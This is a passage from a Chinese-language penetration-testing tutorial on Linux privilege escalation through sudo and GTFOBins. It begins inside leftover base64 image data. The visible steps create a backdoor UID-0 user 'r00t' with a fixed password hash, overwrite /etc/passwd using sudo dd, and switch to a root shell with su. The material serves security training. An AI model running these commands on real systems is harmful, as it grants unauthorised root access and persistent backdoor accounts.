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" width="354" height="64" class="img_ev3q"></p>
<p>运行命令后，我们将获得一个哈希值 <strong>ShuKpZV7v9akI</strong>  – 请将此值放在手边，因为我们将在下一个命令中需要它。</p>
<p>去创建名为r00t的第二个 root 用户 ，我们可以将以下行添加到passwd文件中 –  <strong>r00t:ShuKpZV7v9akI:0:0:root:/root:/bin/bash</strong></p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">echo &#x27;r00t:ShuKpZV7v9akI:0:0:root:/root:/bin/bash&#x27; &gt;&gt; ./passwd</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240517165046899-1536912698-f188361706c449967d06eb9c765170ff.png" width="748" height="59" class="img_ev3q"></p>
<blockquote>
<p>因为 UID 和 GID 设置为“0”，所以用户“r00t”实际上是 root。</p>
</blockquote>
<p>现在，我们需要做的就是使用<strong>dd</strong>读取（输入）编辑后的<strong>passwd</strong>文件，然后写入（输出）它来代替原始文件。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">sudo dd if=/tmp/passwd of=/etc/passwd</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240517165047814-1144079616-1c897cadcdea9888b8aa456422032c54.png" width="553" height="108" class="img_ev3q"></p>
<p>Boom！我们成功地将新的 root 用户添加到 <strong>etc/passwd</strong>文件中！</p>
<p>现在我们可以简单地使用<strong>su</strong>命令来获取 root shell。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240517165046992-256098939-98f2ad90b64d25066d1264067c3dbd41.png" width="339" height="94" class="img_ev3q"></p>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="5最后的想法"><div id="id5">5、最后的想法</div><a href="#5最后的想法" class="hash-link" aria-label="5最后的想法的直接链接" title="5最后的想法的直接链接">​</a></h2>
<p>这些都是好东西，但就 GTFObins 上可找到的易受攻击二进制文件的数量而言，我们只是刚刚触及表面。</p>
<p>继续第 2 部分，我们将把重点从 GTFOBins 上发现的二进制文件转移到一些更高级的<strong>sudo</strong>利用技术。</p></div></article><nav class="pagination-nav docusaurus-mt-lg" aria-label="文件选项卡"><a class="pagination-nav__link pagination-nav__link--prev" href="/web/docs/渗透/Linux 提权/Linux 提权-SUID_SGID_2"><div class="pagination-nav__sublabel">上一页</div><div class="pagination-nav__label">Linux 提权-SUID_SGID_2</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/web/docs/渗透/Linux 提权/Linux 提权-Sudo_2"><div class="pagination-nav__sublabel">下一页</div><div class="pagination-nav__label">Linux 提权-Sudo_2</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#导航" class="table-of-contents__link toc-highlight">导航</a></li><li><a href="#0前言" class="table-of-contents__link toc-highlight"><div>0、前言</div></a></li><li><a href="#1什么是-sudo-以及它是如何工作" class="table-of-contents__link toc-highlight"><div>1、什么是 Sudo 以及它是如何工作？</div></a></li><li><a href="#2手动寻找-sudo-权限" class="table-of-contents__link toc-highlight"><strong><div>2、手动寻找 Sudo 权限</div></strong></a></li><li><a href="#3自动寻找-sudo-权限--linpeas" class="table-of-contents__link toc-highlight"><strong><div>3、自动寻找 Sudo 权限 – LinPEAS</div></strong></a></li><li><a href="#4利用-sudo-命令--gtfobins" class="table-of-contents__link toc-highlight"><strong><div>4、利用 Sudo 命令 – GTFOBins</div></strong></a></li><li><a href="#5最后的想法" class="table-of-contents__link toc-highlight"><div>5、最后的想法</div></a></li></ul></div></div></div></div></main></div></div></div><footer class="footer footer--dark"><div class="container container-fluid"><div class="footer__bottom text--center"><div class="margin-bottom--sm"><a href="https://www.cnblogs.com/kqdssheng" rel="noopener noreferrer" class="footerLogoLink_BH7S"><img src="/web/img/logo.svg" alt="博客园" class="footer__logo themedComponent_mlkZ themedComponent--light_NVdE" width="30" height="30"><img src="/web/img/logo.svg" alt="博客园" class="footer__logo themedComponent_mlkZ themedComponent--dark_xIcU" width="30" height="30"></a></div></div></div></footer></div>
</body>
</html>